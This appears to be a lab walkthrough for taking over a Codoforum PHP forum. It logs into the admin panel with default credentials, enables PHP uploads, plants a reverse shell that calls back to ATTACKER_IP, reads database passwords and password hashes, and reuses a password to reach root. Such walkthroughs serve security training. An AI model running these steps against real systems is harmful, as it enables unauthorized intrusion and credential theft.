# Codoforum

Codoforum / CODOLOGIC exposes a PHP forum on HTTP. If the admin account is still using default credentials, the admin panel can be used to permit PHP uploads and upload a webshell as the forum logo.

## Discovery

```bash
nmap -sC -sV TARGET
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
# 80/tcp open  http    Apache httpd 2.4.41
# http-title: All topics | CODOLOGIC
```

Useful pages:

```text
http://TARGET/
http://TARGET/admin/index.php
```

The front page may identify the software:

```text
Welcome to Codoforum
The only user available to login in the front-end is admin with the password that you set during the installation.
```

## Admin Login

Try the admin panel with default credentials:

```text
URL: http://TARGET/admin/index.php
Username: admin
Password: admin
```

## Admin Upload RCE

Open the global settings page:

```text
http://TARGET/admin/index.php?page=config
```

Allow PHP file uploads:

```text
Allowed Upload types(comma separated):
jpg,jpeg,png,gif,pjpeg,bmp,txt,php

Allowed Mimetypes:
image/*,text/plain,application/x-php
```

Upload a PHP reverse shell as the forum logo:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nc -nlvp 80
```

Trigger the uploaded shell:

```text
http://TARGET/sites/default/assets/img/attachments/php-reverse-shell.php
```

Successful shell:

```text
connect to [ATTACKER_IP] from TARGET
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

## Configuration and Database

Codoforum stores database credentials in:

```bash
cat /var/www/html/sites/default/config.php
```

Useful values:

```php
$config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);
```

Connect to MySQL locally:

```bash
mysql -u codo -h localhost -p
# password: FatPanda123
```

Enumerate forum users:

```sql
use codoforumdb;
select * from codo_users\G
```

Useful rows:

```text
username: admin
mail: admin@codo.pg
pass: $2a$08$NxmF1vhrsnMypsJ1fJkR5OyxtBLWDChyHS4sAT.6ue6SyR2rbmFvS

username: anonymous
mail: anonymous@localhost
pass: youJustCantCrackThis
```

## Root Credential Reuse

In this path, the Codoforum database password was reused by `root`:

```bash
su root
# password: FatPanda123
id
# uid=0(root) gid=0(root) groups=0(root)
```

## References

- https://www.exploit-db.com/raw/50978
